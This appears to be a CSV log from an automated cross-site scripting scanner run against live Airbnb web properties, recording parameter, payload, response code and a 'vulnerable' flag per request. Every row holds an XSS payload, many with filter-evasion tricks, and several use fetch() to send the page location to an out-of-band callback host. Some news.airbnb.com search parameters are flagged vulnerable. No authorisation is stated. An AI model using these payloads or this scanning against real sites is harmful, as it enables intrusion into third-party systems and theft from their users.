url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://investors.airbnb.com/events-and-presentations/default.aspx,__EVENTARGUMENT,"&#x3c;img src=x onerror=alert(""XSS"")&#x3e;",nginx,POST,403,2.557431936264038,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/gift/buy?country=US&card_name=seagulls,sender_name,"&#x3c;DIV STYLE=""width: expression(alert('XSS'));""&#x3e;",nginx,GET,403,2.527103900909424,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,liaFormContentKey,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",apache,POST,403,3.7479045391082764,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/events-and-presentations/default.aspx,__VIEWSTATE,"<img src=""x"" on/**/error=""alert('XSS')"" />",nginx,POST,403,2.8661131858825684,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,t:cp,&#34;><img src=x on/**/error=alert('XSS')>,apache,POST,500,4.2489917278289795,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108741117&purchaseAttemptId=1750108741117&card_id=9014,query,"<img src=""x"" on/**/error=""alert('XSS')"" />",nginx,GET,200,3.2245936393737793,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/events-and-presentations/default.aspx,_ctrl0$ctl39$selectEvergreenEventYear,"<!--#exec cmd=""/bin/echo '<SCR'+'IPT>alert(""XSS"")</SCR'+'IPT>'""-->",nginx,POST,403,3.25235915184021,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,lia-form-context,javAScRiPt:FetCH('//99o5acU1Yd5E.oaST.PrO/JS?loC='+BtOA(wINdow.LOCatIoN)),apache,POST,500,2.404447555541992,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,t:formdata,%26%2334%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,apache,POST,403,6.423414707183838,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108739763&purchaseAttemptId=1750108739763&card_id=9020,query,%3Ca%20href%3D%22javascript%3Avoid%280%29%22%20onmouseover%3D%22alert%281%29%22%3EClick%20Me%3C/a%3E,nginx,GET,200,4.550902843475342,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/events-and-presentations/default.aspx,__antiCSRF,"<img foo=a src=""javascript:al	ert(1)('XSS')"">",nginx,POST,403,2.645125389099121,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/events-and-presentations/default.aspx,__RequestVerificationAntiCSRFToken,%00<svg/onload=fetch(&#x27;//99o5acu1yd5e.oast.pro/svg?loc=&#x27;+btoa(window.location))%00>,nginx,POST,403,3.1145355701446533,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,liaFormContentKey,%3Ca%20foo%3Da%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,apache,POST,500,2.3566253185272217,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,lia-action-token,&#x3c;s&#x3c;Sc&#x3c;script&#x3e;ript&#x3e;alert('XSS')&#x3c;/script&#x3e;,apache,POST,500,6.027602195739746,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com#simple-header-locale-menu-combined,query,&#34><img src=x on/**/error=alert('XSS')>,nginx,GET,200,4.566853046417236,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=fireside,delivery_method_digital,"data:text/html,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",nginx,GET,403,3.1397202014923096,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,t:formdata,"<iMG sRc=""HtTp://eXamplE.com/ImAge.Jpg"">",apache,POST,500,2.4901957511901855,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,form_UID,"""><sCriPT>ALERt(""Xss"")</sCRiPt>",apache,POST,403,2.280117988586426,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=fireside,delivery_method_sms,"&#x3c;OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/xss.html""&#x3e;&#x3c;/OBJECT&#x3e;",nginx,GET,403,2.5309693813323975,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://news.airbnb.com/en-uk/,s,%3Cimg%20src%3Dx%20onerror%3Dfetch%28%27//99o5acu1yd5e.oast.pro/img%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E,nginx,GET,200,3.177006959915161,"<html lang=""en-GB""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""en-GB""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,script,1,2,1,0,0,script_content,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,lia-action-token,<script>alert(1)</script>,apache,POST,500,3.9079744815826416,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,form_instance_key,"&#x3c;img foo=a src=""javascript:alert('XSS')""&#x3e;",apache,POST,403,2.285154104232788,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=fireside,recipient_name,"<IMg FOO=A SRC=""JAVasCript:alERT('XsS')"">",nginx,GET,403,2.4880192279815674,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=fireside,gift_message,&#x3c;s&#x3c;Sc&#x3c;script&#x3e;ript&#x3e;alert('XSS')&#x3c;/script&#x3e;,nginx,GET,403,2.659811496734619,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108738935&purchaseAttemptId=1750108738935&card_id=9024,query,%26%23x22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,nginx,GET,200,3.846139669418335,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,subject,"<IMg srC=x OnErRoR=EVaL(""Alert('XSs')"")>",apache,POST,403,2.5357980728149414,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,form_UID,"<iMg OnMOUSeOver=""aleRt('XsS')"" src=""x"">",apache,POST,500,6.053991794586182,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/fr-be/,s,%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/iframe%3E,nginx,GET,200,3.863269805908203,"<html lang=""fr-BE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""fr-BE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,script,1,2,1,0,0,script_content,0,0
http://airbnb.com/gift/buy?country=US&card_name=fireside,sender_name,"&#x3c;iframe src=""javascript:alert('XSS')""&#x3e;&#x3c;/iframe&#x3e;",nginx,GET,403,2.578145980834961,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,submitContextX,"&#x3c;script&#x3e;alert(""XSS"")&#x3c;/script&#x3e;",apache,POST,403,2.262418746948242,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,form_instance_key,&#34><img src=x onerror=alert('XSS')>,apache,POST,500,2.3248612880706787,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com#site-content,query,"<a href=""javascript:alert('XSS')"">Click Me</a>",nginx,GET,200,3.197314739227295,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,submitContext,"<a href=""javascript:void(0)"" onmouseover=""al	ert(1)(1)"">Click Me</a>",apache,POST,403,5.275235652923584,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,submitContextX,"<img foo=a src=""javascript:al	ert(1)('XSS')"">",apache,POST,500,5.260755300521851,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/#guest-header-dropdownmenu,query,"%00<a href=%00""javascript:eval(&#x27;alert(\&#x27;XSS\&#x27;)&#x27;)%00""%00>Click Me%00</a%00>",nginx,GET,200,2.977470874786377,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108741730&purchaseAttemptId=1750108741730&card_id=9015,query,"%00<script%00>alert(%00""XSS%00"")%00</script%00>",nginx,GET,200,2.679388999938965,"<html><head>
  <meta charset=""utf-8"">
  <title>503 Service Unavailable - Airbnb</title>

  <link hre",0,"<html><head>
  <meta charset=""utf-8"">
  <title>503 Service Unavailable - Airbnb</title>

  <link hre",0,generic,0,0,0,0,0,none,10,2
https://news.airbnb.com/ms/,s,%3Cimg%20onmouseover%3D%22alert%28%27XSS%27%29%22%20src%3D%22x%22%3E,nginx,GET,200,3.681577682495117,"<html lang=""ms-MY""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""ms-MY""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,script,1,2,1,0,0,script_content,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,submitContext,<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>,apache,POST,500,2.5620551109313965,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,tinyMceEditor,"<TABLE><TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",apache,POST,403,5.239670515060425,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,messageSearchField,"<swF><PARAM NAME=MovIe ValUe=""Javascript:ALERt('xss')""></Param><EmBed sRc=""jAvAsCriPt:alERt('XSS')""></embED></SWF>",apache,POST,500,3.1278128623962402,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,board,"<img src=""x"" on/**/error=""alert('XSS')"" />",apache,POST,403,3.0492002964019775,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://airbnb.com/,query,&#34;><iMg SRc=x oNError=alERT('xss')>,nginx,GET,200,3.4232418537139893,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,generic,1,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,messageSearchField_0,<script>al	ert(1)(1)</script>,apache,POST,500,5.367169380187988,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,customlabels_selected,javascript%3Aconfirm%28%22XSS%22%29,apache,POST,403,2.38763689994812,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/pt/,s,"<scri pt>alert(""XSS"")</script>",nginx,GET,200,3.8259658813476562,"<html lang=""pt-BR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""pt-BR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,generic,1,2,1,0,0,none,0,0
